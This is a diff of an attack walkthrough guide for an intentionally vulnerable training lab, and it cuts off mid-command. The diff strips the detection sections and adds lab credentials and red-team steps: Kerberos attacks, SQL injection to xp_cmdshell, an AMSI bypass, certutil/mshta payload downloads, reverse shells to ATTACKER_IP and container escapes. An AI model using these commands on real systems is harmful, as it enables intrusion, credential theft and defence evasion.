@@ -1,542 +1,624 @@
-# 📓 MODERN KILL LAB: OPERATOR'S FIELD GUIDE v8.0
-
-This guide covers all attack vectors with step-by-step instructions for:
-- 🔴 **Red Team:** Exploitation techniques
-- 🔵 **Blue Team:** Detection, hunting, and response
+# 📓 MODERN KILL LAB // OPERATOR'S FIELD GUIDE
 
 ---
 
-# 🎯 TARGET ALPHA: Lab-DC01 (Windows Server 2022)
+## 🌐 NETWORK TOPOLOGY
 
-**Role:** Domain Controller, Database Server, Certificate Authority
-
----
-
-## 🔓 VECTOR 1: AS-REP Roasting
-
-| Property | Value |
-|----------|-------|
-| **Target** | `svc_backup` account |
-| **Vulnerability** | "Do not require Kerberos preauthentication" enabled |
-| **Password** | `Backup2024!` |
-| **Tools** | Impacket GetNPUsers.py, Rubeus |
-
-### 🔴 Red Team
-
-**1. Request AS-REP Hash (No Creds Required):**
-```bash
-GetNPUsers.py LAB.local/svc_backup -no-pass -dc-ip 10.0.0.10 -format hashcat -outputfile asrep.hash
+```
+╔═══════════════════════════════════════════════════════════════════════════════╗
+║                          psycholab (Internal Network)                         ║
+╠═══════════════════════════════════════════════════════════════════════════════╣
+║                                                                               ║
+║   ┌─────────────────────────┐              ┌─────────────────────────┐       ║
+║   │       Lab-DC01          │              │       Lab-Web01         │       ║
+║   │       10.0.0.10         │◄────────────►│       10.0.0.20         │       ║
+║   │                         │   DOMAIN     │                         │       ║
+║   │   Windows Server 2022   │    TRUST     │      Debian 12          │       ║
+║   │   Domain Controller     │              │   Domain-Joined         │       ║
+║   │   Certificate Authority │              │   Container Host        │       ║
+║   │   SQL Server            │              │   Kubernetes (K3s)      │       ║
+║   │   Web Server (XAMPP)    │              │   Web Applications      │       ║
+║   └─────────────────────────┘              └─────────────────────────┘       ║
+║                                                                               ║
+╚═══════════════════════════════════════════════════════════════════════════════╝
 ```
 
-**2. Crack the Hash:**
+---
+
+## 🔑 CREDENTIALS
+
+### Domain Accounts (LAB.local)
+
+| Account | Password | Notes |
+|---------|----------|-------|
+| `LAB\vagrant` | `Vagrant!123` | Domain Admin |
+| `LAB\Administrator` | `Vagrant!123` | Domain Admin |
+| `LAB\svc_sql` | `Password123!` | Kerberoastable, SQL sysadmin |
+| `LAB\svc_backup` | `Backup2024!` | AS-REP Roastable |
+| `LAB\helpdesk` | `Help123!` | Standard user |
+| `krbtgt` | `GodMode123!` | Golden Ticket target |
+
+### Hidden Credentials (Discovery Required)
+
+| Location | Value |
+|----------|-------|
+| Azure AD Sync XML | `Valhalla123!` (Base64 encoded) |
+| Credential Manager | `LAB\backup_admin` : `BackupP@ss123!` |
+| Linux .env file | Fake API keys |
+
+### Linux Accounts
+
+| Account | Password |
+|---------|----------|
+| `vagrant` | `vagrant` |
+| `LAB\vagrant` | `Vagrant!123` |
+
+### Other Passwords
+
+| Item | Password |
+|------|----------|
+| DSRM Safe Mode | `Vulnerable123!` |
+
+---
+
+## 🔧 QUICK ACCESS
+
+### Web Services
+
+| Service | URL |
+|---------|-----|
+| AD CS Web Enrollment | http://10.0.0.10/certsrv |
+| HR Portal (SQLi) | http://10.0.0.10:8080/hr_portal |
+| AI Agent | http://10.0.0.20:5000 |
+| Juice Shop | http://10.0.0.20:3000 |
+| vAPI | http://10.0.0.20:5002 |
+
+### Remote Access
+
 ```bash
+# DC01 - RDP
+xfreerdp /v:10.0.0.10 /u:LAB\\vagrant /p:'Vagrant!123'
+
+# DC01 - WinRM
+evil-winrm -i 10.0.0.10 -u vagrant -p 'Vagrant!123'
+
+# Web01 - SSH (local)
+ssh vagrant@10.0.0.20
+
+# Web01 - SSH (domain)
+ssh LAB\\vagrant@10.0.0.20
+
+# Web01 - SMB (anonymous)
+smbclient //10.0.0.20/backup_drop -N
+```
+
+---
+
+## 📁 DIRECTORY STRUCTURE
+
+### DC01 (Windows)
+
+```
+C:\Tools\
+├── AMSILab\
+│   └── vuln.ps1              # AMSI bypass lab
+├── VEHLab\
+│   ├── FakeEDR.cs            # Source
+│   └── FakeEDR.exe           # Compiled EDR
+├── CredLab\
+│   ├── SAM.bak               # SAM hive backup
+│   ├── SYSTEM.bak            # SYSTEM hive backup
+│   └── SECURITY.bak          # SECURITY hive backup
+├── LOLBinLab\
+│   └── payload.csproj        # MSBuild payload
+└── PersistenceLab\
+
+C:\Program Files\Azure AD Sync\
+└── connection.xml            # Fake cloud credentials
+
+C:\xampp\htdocs\hr_portal\
+└── index.php                 # SQL Injection vulnerability
+```
+
+### Web01 (Linux)
+
+```
+/home/vagrant/
+├── ai_agent/
+│   └── app.py                # Vulnerable Flask app
+├── container_lab/
+│   └── docker-compose-vuln.yml
+├── k8s_lab/
+│   └── vuln.yaml             # Overprivileged ServiceAccount
+├── exfil_lab/
+│   └── .env                  # Hardcoded secrets
+├── share/                    # SMB writable share
+├── crapi/
+│   └── docker-compose.yml
+└── .kube/
+    └── config                # K3s kubeconfig
+```
+
+---
+
+# 🎯 TARGET ALPHA: Lab-DC01 EXPLOITATION
+
+---
+
+## VULN 1: AS-REP Roasting
+
+### What It Is
+When a user account has "Do not require Kerberos preauthentication" enabled, anyone can request an encrypted TGT for that account without providing a password. This TGT can then be cracked offline.
+
+### Why It Works
+Kerberos preauthentication normally requires the client to prove they know the password before the KDC issues a TGT. When disabled, the KDC blindly returns an encrypted ticket that attackers can crack at their leisure.
+
+### Configuration
+- **Account:** `svc_backup`
+- **Setting:** `DONT_REQUIRE_PREAUTH` flag (UAC 4194304)
+
+### Exploitation
+
+```bash
+# Request AS-REP hash (no credentials needed)
+GetNPUsers.py LAB.local/svc_backup -no-pass -dc-ip 10.0.0.10 -format hashcat -outputfile asrep.hash
+
+# Crack with hashcat
 hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
 ```
 
-**Result:** `svc_backup:Backup2024!`
+### Result
+**Password:** `Backup2024!`
 
-**Alternative with Rubeus (from Windows):**
-```powershell
-.\Rubeus.exe asreproast /user:svc_backup /format:hashcat /outfile:asrep.hash
-```
-
-### 🔵 Blue Team
-
-**Detection - Event ID 4768:**
-```powershell
-Get-WinEvent -FilterHashtable @{LogName='Security';Id=4768} |
-    Where-Object {$_.Properties[4].Value -eq '0x0'} |
-    Select-Object TimeCreated, @{N='Account';E={$_.Properties[0].Value}}, @{N='IP';E={$_.Properties[9].Value}}
-```
-
-**Indicators:**
-- Event ID 4768 with PreAuth Type = 0
-- TGT requests from non-standard workstations
-
-**Remediation:**
-- Enable Kerberos preauth for all accounts
-- Use 25+ character passwords for service accounts
+### Tools
+- Impacket `GetNPUsers.py`
+- Rubeus
+- hashcat
 
 ---
 
-## 🔓 VECTOR 2: Kerberoasting
+## VULN 2: Kerberoasting
 
-| Property | Value |
-|----------|-------|
-| **Target** | `svc_sql` account |
-| **SPN** | `MSSQLSvc/dc01.lab.local:1433` |
-| **Password** | `Password123!` |
-| **Tools** | Impacket GetUserSPNs.py, Rubeus |
+### What It Is
+Service accounts with SPNs (Service Principal Names) can have their TGS tickets requested by any authenticated user. These tickets are encrypted with the service account's password hash and can be cracked offline.
 
-### 🔴 Red Team
+### Why It Works
+Any authenticated domain user can request a TGS for any SPN. The ticket is encrypted with the service account's NTLM hash. Weak passwords make these trivially crackable.
 
-**1. Enumerate SPNs:**
+### Configuration
+- **Account:** `svc_sql`
+- **SPN:** `MSSQLSvc/dc01.lab.local:1433`
+
+### Exploitation
+
 ```bash
-GetUserSPNs.py LAB.local/helpdesk:Help123! -dc-ip 10.0.0.10
-```
-
-**2. Request TGS Hash:**
-```bash
+# Enumerate SPNs and request tickets
 GetUserSPNs.py LAB.local/helpdesk:Help123! -dc-ip 10.0.0.10 -request -outputfile tgs.hash
-```
 
-**3. Crack the Hash:**
-```bash
+# Crack with hashcat
 hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
 ```
 
-**Result:** `svc_sql:Password123!`
+### Result
+**Password:** `Password123!`
 
-### 🔵 Blue Team
-
-**Detection - Event ID 4769:**
-```powershell
-Get-WinEvent -FilterHashtable @{LogName='Security';Id=4769} |
-    Where-Object {$_.Properties[5].Value -eq '0x17'} |
-    Select-Object TimeCreated, @{N='Service';E={$_.Properties[0].Value}}, @{N='User';E={$_.Properties[2].Value}}
-```
-
-**Indicators:**
-- Event ID 4769 with Encryption Type 0x17 (RC4)
-- Single user requesting multiple TGS tickets
-
-**Remediation:**
-- Use Group Managed Service Accounts (gMSA)
-- Enforce AES encryption only
+### Tools
+- Impacket `GetUserSPNs.py`
+- Rubeus
+- hashcat
 
 ---
 
-## 🔓 VECTOR 3: Golden Ticket
+## VULN 3: Golden Ticket
 
-| Property | Value |
-|----------|-------|
-| **Target** | `krbtgt` account |
-| **Password** | `GodMode123!` |
-| **Tools** | Impacket ticketer.py, Mimikatz |
+### What It Is
+A Golden Ticket is a forged Kerberos TGT that grants unlimited access to the entire domain. It's created using the `krbtgt` account's password hash.
 
-### 🔴 Red Team
+### Why It Works
+The `krbtgt` account encrypts all TGTs in the domain. If you know its password/hash, you can forge tickets for any user with any privileges, and they'll be trusted by all domain services.
 
-**1. Get krbtgt NTLM Hash (if you have the password):**
-```python
-# Python - NTLM from password
-import hashlib
-password = "GodMode123!"
-ntlm = hashlib.new('md4', password.encode('utf-16le')).hexdigest()
-print(ntlm)
-```
+### Configuration
+- **Account:** `krbtgt`
+- **Password:** `GodMode123!`
 
-**2. Get Domain SID:**
+### Exploitation
+
 ```bash
+# Get domain SID
 lookupsid.py LAB.local/helpdesk:Help123!@10.0.0.10
-```
 
-**3. Forge Golden Ticket:**
-```bash
-ticketer.py -nthash <KRBTGT_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain lab.local Administrator
-```
+# Convert password to NTLM (or use mimikatz lsadump)
+# NTLM of GodMode123! = [calculate with python or use secretsdump]
 
-**4. Use the Ticket:**
-```bash
+# Forge Golden Ticket
+ticketer.py -nthash <KRBTGT_HASH> -domain-sid <SID> -domain lab.local Administrator
+
+# Use the ticket
 export KRB5CCNAME=Administrator.ccache
 psexec.py -k -no-pass lab.local/Administrator@dc01.lab.local
 ```
 
-**Alternative with Mimikatz:**
-```
-kerberos::golden /user:Administrator /domain:lab.local /sid:<SID> /krbtgt:<NTLM_HASH> /ptt
-```
+### Result
+**Full domain compromise** with forged Administrator ticket.
 
-### 🔵 Blue Team
-
-**Detection - Event ID 4769:**
-```powershell
-# TGS requests with forged TGT have anomalies
-Get-WinEvent -FilterHashtable @{LogName='Security';Id=4769} |
-    Where-Object {$_.Properties[0].Value -eq 'krbtgt'}
-```
-
-**Indicators:**
-- TGT with abnormally long lifetime
-- User SID mismatch
-- Requests for krbtgt service
-
-**Remediation:**
-- Reset krbtgt password TWICE
-- Monitor for TGT anomalies
-- Implement PAC validation
+### Tools
+- Impacket `ticketer.py`, `lookupsid.py`
+- Mimikatz
 
 ---
 
-## 🔓 VECTOR 4: AD CS Misconfiguration (ESC8)
+## VULN 4: AD CS ESC8 (NTLM Relay to HTTP Enrollment)
 
-| Property | Value |
-|----------|-------|
-| **Target** | `http://10.0.0.10/certsrv` |
-| **Vulnerability** | Web Enrollment on HTTP without EPA |
-| **Tools** | ntlmrelayx.py, PetitPotam, Coercer |
+### What It Is
+AD Certificate Services Web Enrollment accepts NTLM authentication over HTTP without Extended Protection for Authentication (EPA). This allows attackers to relay captured NTLM authentication to request certificates.
 
-### 🔴 Red Team
+### Why It Works
+When a machine or user authenticates via NTLM, that authentication can be relayed to another service. AD CS Web Enrollment on HTTP is a prime target because a certificate can then be used to authenticate as the relayed identity.
 
-**1. Verify HTTP Web Enrollment:**
+### Configuration
+- **URL:** `http://10.0.0.10/certsrv`
+- **Issue:** HTTP (not HTTPS), no EPA
+
+### Exploitation
+
 ```bash
-curl -I http://10.0.0.10/certsrv/
-# Look for: WWW-Authenticate: NTLM
-```
-
-**2. Setup NTLM Relay:**
-```bash
-# Terminal 1 - Start ntlmrelayx
+# Terminal 1: Start relay to AD CS
 ntlmrelayx.py -t http://10.0.0.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
-```
 
-**3. Coerce Authentication:**
-```bash
-# Terminal 2 - Trigger authentication
+# Terminal 2: Coerce authentication (e.g., via PetitPotam or SQLi)
 python3 PetitPotam.py ATTACKER_IP 10.0.0.10
-# Or via SQL Injection:
-# http://10.0.0.10:8080/hr_portal/index.php?id=1;EXEC xp_cmdshell 'ping ATTACKER_IP'--
-```
 
-**4. Use Obtained Certificate:**
-```bash
-# Request TGT with certificate
+# Or trigger via SQL Injection:
+# http://10.0.0.10:8080/hr_portal/index.php?id=1;EXEC xp_cmdshell 'dir \\ATTACKER_IP\share'--
+
+# Use obtained certificate
 Rubeus.exe asktgt /user:DC01$ /certificate:cert.pfx /ptt
 ```
 
-### 🔵 Blue Team
+### Result
+**Certificate for DC machine account** → DCSync or full domain compromise.
 
-**Detection - Certificate Events:**
-```powershell
-Get-WinEvent -FilterHashtable @{LogName='Security';Id=4886,4887} |
-    Select-Object TimeCreated, @{N='Requester';E={$_.Properties[0].Value}}, @{N='Template';E={$_.Properties[1].Value}}
-```
-
-**Indicators:**
-- Certificate requests from unexpected hosts
-- Machine accounts requesting user templates
-- HTTP requests to /certsrv from external IPs
-
-**Remediation:**
-- Enable HTTPS on AD CS
-- Enable Extended Protection for Authentication (EPA)
-- Disable HTTP Web Enrollment if not needed
+### Tools
+- Impacket `ntlmrelayx.py`
+- PetitPotam
+- Coercer
+- Rubeus
 
 ---
 
-## 🔓 VECTOR 5: SQL Injection
+## VULN 5: SQL Injection
 
-| Property | Value |
-|----------|-------|
-| **Target** | `http://10.0.0.10:8080/hr_portal` |
-| **Vulnerability** | `SELECT ... WHERE ID = $id` (unsanitized) |
-| **Tools** | SQLMap, Burp Suite, Browser |
+### What It Is
+The HR Portal web application concatenates user input directly into SQL queries without sanitization, allowing attackers to inject arbitrary SQL commands.
 
-### 🔴 Red Team
+### Why It Works
+The PHP code does:
+```php
+$sql = "SELECT Name, Salary FROM Employees WHERE ID = " . $id;
+```
+No prepared statements, no input validation.
 
-**1. Test for SQLi:**
+### Configuration
+- **URL:** `http://10.0.0.10:8080/hr_portal/index.php?id=1`
+- **Database:** HR_DB on SQL Server Express
+
+### Exploitation
+
 ```bash
+# Test for injection
 curl "http://10.0.0.10:8080/hr_portal/index.php?id=1'"
-# Error = SQLi confirmed
-```
+# Error = injectable
 
-**2. Extract Data:**
-```bash
-curl "http://10.0.0.10:8080/hr_portal/index.php?id=-1 UNION SELECT Name,Salary FROM Employees--"
-```
+# Union-based data extraction
+curl "http://10.0.0.10:8080/hr_portal/index.php?id=-1 UNION SELECT name,password_hash FROM sys.sql_logins--"
 
-**3. Enable xp_cmdshell (svc_sql is sysadmin):**
-```bash
+# Enable xp_cmdshell (svc_sql is sysadmin)
 curl "http://10.0.0.10:8080/hr_portal/index.php?id=1;EXEC sp_configure 'show advanced options',1;RECONFIGURE--"
 curl "http://10.0.0.10:8080/hr_portal/index.php?id=1;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE--"
-```
 
-**4. Execute OS Commands:**
-```bash
+# Execute OS commands
 curl "http://10.0.0.10:8080/hr_portal/index.php?id=1;EXEC xp_cmdshell 'whoami'--"
-```
 
-**5. Automated with SQLMap:**
-```bash
+# Automated exploitation
 sqlmap -u "http://10.0.0.10:8080/hr_portal/index.php?id=1" --os-shell
 ```
 
-### 🔵 Blue Team
+### Result
+**OS command execution** as the SQL Server service account.
 
-**Detection - SQL Server Logs:**
-```powershell
-Get-WinEvent -FilterHashtable @{LogName='Application';ProviderName='MSSQLSERVER'} |
-    Where-Object {$_.Message -match 'xp_cmdshell|UNION|sp_configure'}
-```
-
-**Indicators:**
-- `UNION SELECT` in query logs
-- `xp_cmdshell` enablement
-- `sqlservr.exe` spawning `cmd.exe`
-
-**Remediation:**
-- Use parameterized queries
-- Remove sysadmin from service accounts
-- Disable xp_cmdshell permanently
+### Tools
+- SQLMap
+- Burp Suite
+- curl
 
 ---
 
-## 🔓 VECTOR 6: Weak Service Permissions
+## VULN 6: Weak SQL Service Permissions
 
-| Property | Value |
-|----------|-------|
-| **Target** | `svc_sql` account |
-| **Vulnerability** | Member of SQL Server `sysadmin` role |
-| **Tools** | SQLMap, Netcat |
+### What It Is
+The `svc_sql` service account is a member of the SQL Server `sysadmin` role, giving it complete control over the database server including the ability to execute operating system commands.
 
-### 🔴 Red Team
+### Why It Works
+SQL Server's `sysadmin` role can enable and use `xp_cmdshell` to run arbitrary commands on the underlying Windows system.
 
-**Once you have svc_sql credentials or SQLi access:**
+### Configuration
+- **Account:** `LAB\svc_sql`
+- **Role:** `sysadmin` in SQL Server
 
-**1. Enable xp_cmdshell:**
+### Exploitation
+Once you have `svc_sql` credentials (via Kerberoasting):
+
 ```sql
+-- Enable xp_cmdshell
 EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
-```
 
-**2. Execute Commands:**
-```sql
+-- Execute commands
 EXEC xp_cmdshell 'whoami';
-EXEC xp_cmdshell 'net user hacker P@ssw0rd /add';
+EXEC xp_cmdshell 'net user hacker Password123! /add';
 EXEC xp_cmdshell 'net localgroup Administrators hacker /add';
 ```
 
-**3. Reverse Shell:**
-```sql
-EXEC xp_cmdshell 'powershell -e <BASE64_PAYLOAD>';
-```
-
-### 🔵 Blue Team
-
-**Detection:**
-- Monitor `xp_cmdshell` usage
-- Alert on new local administrators
-- Monitor SQL Server process spawning shells
+### Result
+**Local administrator** on DC01.
 
 ---
 
-## 🔓 VECTOR 7: Fake Cloud Credentials
+## VULN 7: Fake Cloud Credentials
 
-| Property | Value |
-|----------|-------|
-| **Target** | `C:\Program Files\Azure AD Sync\connection.xml` |
-| **Password** | `Valhalla123!` (Base64 encoded) |
-| **Tools** | PowerShell, aadconnect-extract |
+### What It Is
+A simulated Azure AD Connect installation stores credentials in a configuration file with easily reversible encoding.
 
-### 🔴 Red Team
+### Why It Works
+Many cloud sync tools store credentials locally for service authentication. Weak encryption or encoding makes them trivially recoverable.
 
-**1. Read the Config:**
+### Configuration
+- **File:** `C:\Program Files\Azure AD Sync\connection.xml`
+- **Encoding:** Base64
+
+### Exploitation
+
 ```powershell
+# Read the config
 type "C:\Program Files\Azure AD Sync\connection.xml"
-```
 
-**2. Extract Base64:**
-```xml
-<PasswordEncrypted>VABhAGwAbABoAGEAbABsAGEAMQAyADMAIQ==</PasswordEncrypted>
-```
-
-**3. Decode:**
-```powershell
+# Extract and decode
 [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("VABhAGwAbABoAGEAbABsAGEAMQAyADMAIQ=="))
 ```
 
-**Result:** `Valhalla123!`
-
-### 🔵 Blue Team
-
-**Detection:**
-```powershell
-# Monitor file access to Azure AD Sync folder
-Get-WinEvent -FilterHashtable @{LogName='Security';Id=4663} |
-    Where-Object {$_.Properties[5].Value -like "*Azure AD Sync*"}
-```
+### Result
+**Password:** `Valhalla123!`
 
 ---
 
-## 🔓 VECTOR 8: AMSI & EDR Bypass
+## VULN 8: AMSI Bypass
 
-| Property | Value |
-|----------|-------|
-| **Target** | `C:\Tools\AMSILab\`, `C:\Tools\VEHLab\` |
-| **Tools** | PowerShell, C# exploits |
+### What It Is
+AMSI (Antimalware Scan Interface) is Windows' mechanism for scanning scripts and memory for malware. The lab has intentionally weakened AMSI registry permissions, allowing users to disable it.
 
-### 🔴 Red Team
+### Why It Works
+The AMSI Providers registry key has been given Full Control to BUILTIN\Users, allowing anyone to delete or modify AMSI providers.
 
-**AMSI Bypass (Reflection):**
+### Configuration
+- **Registry:** `HKLM:\SOFTWARE\Microsoft\AMSI\Providers`
+- **Permissions:** Full Control for Users
+
+### Exploitation
+
 ```powershell
+# Test AMSI (should be blocked)
+'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
+
+# Bypass via reflection
 $a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-```
 
-**AMSI Bypass (Registry - Lab has weak ACLs):**
-```powershell
+# Bypass via registry (lab-specific)
 Remove-Item "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\*" -Recurse -Force
+
+# Test again (should work now)
+'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
 ```
 
-**Bypass FakeEDR:**
-```c
-// Remove VEH handlers
-RemoveVectoredExceptionHandler(handler);
+### Result
+**AMSI disabled** - malicious scripts no longer scanned.
 
-// Clear debug registers
-CONTEXT ctx;
-ctx.Dr0 = ctx.Dr1 = ctx.Dr2 = ctx.Dr3 = ctx.Dr7 = 0;
-SetThreadContext(hThread, &ctx);
+---
+
+## VULN 9: VEH/EDR Bypass
+
+### What It Is
+A simulated EDR (FakeEDR.exe) uses Vectored Exception Handlers for monitoring. These can be removed or bypassed by malware.
+
+### Configuration
+- **Location:** `C:\Tools\VEHLab\FakeEDR.exe`
+
+### Exploitation Concepts
+- `RemoveVectoredExceptionHandler()` to unhook
+- Clear debug registers (DR0-DR7)
+- Direct syscalls to bypass userland hooks
+
+---
+
+## VULN 10: Credential Dumping
+
+### What It Is
+Windows stores credentials in multiple locations that can be extracted by attackers with sufficient privileges.
+
+### Configuration
+- **SAM/SYSTEM:** Backed up to `C:\Tools\CredLab\`
+- **Credential Manager:** Contains saved credentials
+
+### Exploitation
+
+```bash
+# From Kali (with extracted hive backups)
+secretsdump.py -sam SAM.bak -system SYSTEM.bak -security SECURITY.bak LOCAL
+
+# View Credential Manager (on DC01)
+cmdkey /list
+
+# Dump with Mimikatz
+mimikatz# sekurlsa::logonpasswords
+mimikatz# vault::cred /patch
 ```
 
-### 🔵 Blue Team
+### Result
+- NTLM hashes from SAM
+- `LAB\backup_admin`:`BackupP@ss123!` from Credential Manager
 
-**Detection:**
+---
+
+## VULN 11: LOLBin Execution
+
+### What It Is
+Living Off the Land Binaries (LOLBins) are legitimate Windows executables that can be abused to execute malicious code while evading security tools.
+
+### Configuration
+- **Payload:** `C:\Tools\LOLBinLab\payload.csproj`
+
+### Exploitation
+
+```cmd
+# MSBuild execution
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Tools\LOLBinLab\payload.csproj
+
+# Certutil download
+certutil -urlcache -split -f http://ATTACKER/payload.exe C:\temp\payload.exe
+
+# MSHTA execution
+mshta http://ATTACKER/payload.hta
+```
+
+### Result
+**Code execution** using signed Microsoft binaries.
+
+---
+
+## VULN 12: Persistence via Scheduled Task
+
+### What It Is
+A hidden scheduled task named "WindowsDefenderUpdate" runs PowerShell at logon, demonstrating common persistence techniques.
+
+### Configuration
+- **Task:** `WindowsDefenderUpdate`
+- **Trigger:** At logon
+- **Context:** SYSTEM
+
+### Discovery
+
 ```powershell
-# Monitor AMSI registry
-Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=12,13} |
-    Where-Object {$_.Properties[4].Value -like "*AMSI*"}
-
-# ScriptBlock logging for bypass attempts
-Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} |
-    Where-Object {$_.Message -match 'AmsiUtils|amsiInitFailed'}
+Get-ScheduledTask -TaskName "WindowsDefenderUpdate" | Format-List *
+schtasks /query /tn "WindowsDefenderUpdate" /v
 ```
 
 ---
 
-# 🎯 TARGET BRAVO: Lab-Web01 (Debian 12)
-
-**Role:** Web Server, Application Security Host, Pivot Point  
-**Domain Status:** Joined to LAB.local
+# 🎯 TARGET BRAVO: Lab-Web01 EXPLOITATION
 
 ---
 
-## 🔓 VECTOR 9: SMB Remote Code Execution
+## VULN 13: SMB Remote Code Execution
 
-| Property | Value |
-|----------|-------|
-| **Target** | `//10.0.0.20/backup_drop` |
-| **Vulnerability** | Cron executes `*.sh` files as ROOT every minute |
-| **Tools** | smbclient, net view |
+### What It Is
+An SMB share allows anonymous write access, and a cron job executes any shell script placed in it as root every minute.
 
-### 🔴 Red Team
+### Why It Works
+The combination of:
+1. Anonymous writable SMB share
+2. `force user = root` in Samba config
+3. Cron job that executes `*.sh` files in the share
 
-**1. Connect Anonymously:**
+### Configuration
+- **Share:** `//10.0.0.20/backup_drop`
+- **Cron:** Runs `bash` on all `.sh` files every minute, then deletes them
+
+### Exploitation
+
 ```bash
+# Connect anonymously
 smbclient //10.0.0.20/backup_drop -N
-```
 
-**2. Create Reverse Shell Script:**
-```bash
+# Create reverse shell
 echo '#!/bin/bash
 bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > shell.sh
-```
 
-**3. Upload Script:**
-```bash
+# Upload
 smb: \> put shell.sh
-```
 
-**4. Start Listener and Wait (~60 seconds):**
-```bash
+# Start listener
 nc -lvnp 4444
-# ROOT SHELL INCOMING!
+
+# Wait ~60 seconds for ROOT shell
 ```
 
-### 🔵 Blue Team
+### Result
+**Root shell** on Web01.
 
-**Detection:**
-```bash
-# Monitor cron execution
-sudo tail -f /var/log/syslog | grep CRON
-
-# Monitor SMB access
-sudo tail -f /var/log/samba/log.smbd
-
-# auditd - watch share directory
-sudo auditctl -w /home/vagrant/share -p wa -k smb_drop
-sudo ausearch -k smb_drop
-```
-
-**Indicators:**
-- New .sh files appearing in `/home/vagrant/share`
-- Cron executing scripts from SMB share
-- Root bash processes spawned by cron
-
-**Remediation:**
-- Remove guest access from SMB
-- Don't use `force user = root`
-- Remove dangerous cron job
+### Tools
+- smbclient
+- netcat
 
 ---
 
-## 🔓 VECTOR 10: Insecure AI Agent
+## VULN 14: AI Agent Command Injection
 
-| Property | Value |
-|----------|-------|
-| **Target** | `http://10.0.0.20:5000` |
-| **Vulnerability** | `subprocess.check_output(query, shell=True)` |
-| **Tools** | curl, Browser |
+### What It Is
+A Flask web application passes user input directly to `subprocess.check_output()` with `shell=True`, allowing arbitrary command execution.
 
-### 🔴 Red Team
+### Why It Works
+```python
+out = subprocess.check_output(q, shell=True, stderr=subprocess.STDOUT)
+```
+No input validation whatsoever.
 
-**1. Test RCE:**
+### Configuration
+- **URL:** `http://10.0.0.20:5000/ask?query=`
+- **Service:** Runs as root
+
+### Exploitation
+
 ```bash
+# Test command execution
 curl "http://10.0.0.20:5000/ask?query=id"
 # Returns: uid=0(root)...
 
+# Read sensitive files
 curl "http://10.0.0.20:5000/ask?query=cat%20/etc/shadow"
-```
-
-**2. Steal Kubeconfig:**
-```bash
 curl "http://10.0.0.20:5000/ask?query=cat%20/home/vagrant/.kube/config"
-```
 
-**3. Reverse Shell:**
-```bash
+# Reverse shell
 nc -lvnp 4444
-curl "http://10.0.0.20:5000/ask?query=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/ATTACKER_IP/4444%200%3E%261'"
+curl "http://10.0.0.20:5000/ask?query=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/ATTACKER_IP/4444%200>%261'"
 ```
 
-### 🔵 Blue Team
-
-**Detection:**
-```bash
-# Monitor processes spawned by Python
-ps auxf | grep -A5 python3
-
-# auditd
-sudo ausearch -c bash --ppid $(pgrep -f app.py)
-```
+### Result
+**Root shell** on Web01.
 
 ---
 
-## 🔓 VECTOR 11: Unsecured Kubernetes
+## VULN 15: Kubernetes Privilege Escalation
 
-| Property | Value |
-|----------|-------|
-| **Target** | `vuln-admin-sa` ServiceAccount |
-| **Vulnerability** | Has `cluster-admin` privileges |
-| **Tools** | kubectl |
+### What It Is
+A ServiceAccount with `cluster-admin` privileges exists in the default namespace, allowing full control over the Kubernetes cluster.
 
-### 🔴 Red Team
+### Why It Works
+The `vuln-admin-sa` ServiceAccount is bound to the `cluster-admin` ClusterRole, giving it unrestricted access to all cluster resources.
 
-**1. Get ServiceAccount Token:**
+### Configuration
+- **ServiceAccount:** `vuln-admin-sa`
+- **ClusterRoleBinding:** `vuln-binding` → `cluster-admin`
+
+### Exploitation
+
 ```bash
-# Via AI Agent
-curl "http://10.0.0.20:5000/ask?query=cat%20/var/run/secrets/kubernetes.io/serviceaccount/token"
+# Check permissions
+kubectl auth can-i --list --as=system:serviceaccount:default:vuln-admin-sa
 
-# Or locally
-kubectl get secret -o jsonpath='{.items[?(@.metadata.annotations.kubernetes\.io/service-account\.name=="vuln-admin-sa")].data.token}' | base64 -d
-```
+# Dump all secrets
+kubectl get secrets -A -o yaml --as=system:serviceaccount:default:vuln-admin-sa
 
-**2. Use Token:**
-```bash
-kubectl --token=$TOKEN --server=https://10.0.0.20:6443 --insecure-skip-tls-verify get secrets -A
-```
-
-**3. Deploy Privileged Pod:**
-```bash
+# Deploy privileged pod
 kubectl apply -f - <<EOF
 apiVersion: v1
 kind: Pod
@@ -560,229 +642,220 @@ spec:
     hostPath:
       path: /
 EOF
+
+# Escape to host
+kubectl exec -it pwned -- chroot /host bash
 ```
 
-### 🔵 Blue Team
-
-**Detection:**
-```bash
-# K8s API audit logs
-sudo cat /var/log/containers/kube-apiserver* | grep -E "secrets|privileged"
-```
+### Result
+**Root on host** via Kubernetes escape.
 
 ---
 
-## 🔓 VECTOR 12: Privileged Container
+## VULN 16: Privileged Container Escape
 
-| Property | Value |
-|----------|-------|
-| **Container** | `vuln_priv` |
-| **Vulnerability** | `--privileged` flag |
-| **Tools** | Docker escape exploits |
+### What It Is
+A Docker container running with `--privileged` flag has full access to the host's kernel and devices.
 
-### 🔴 Red Team
+### Why It Works
+Privileged containers can mount host filesystems and have unrestricted access to devices.
 
-**1. Enter Container:**
+### Configuration
+- **Container:** `vuln_priv`
+
+### Exploitation
+
 ```bash
+# Enter container
 docker exec -it container_lab-vuln_priv-1 bash
-```
 
-**2. Find Host Disk:**
-```bash
+# Find host disk
 fdisk -l
-# Find /dev/sda1
-```
 
-**3. Mount and Escape:**
-```bash
+# Mount and escape
 mkdir /mnt/host
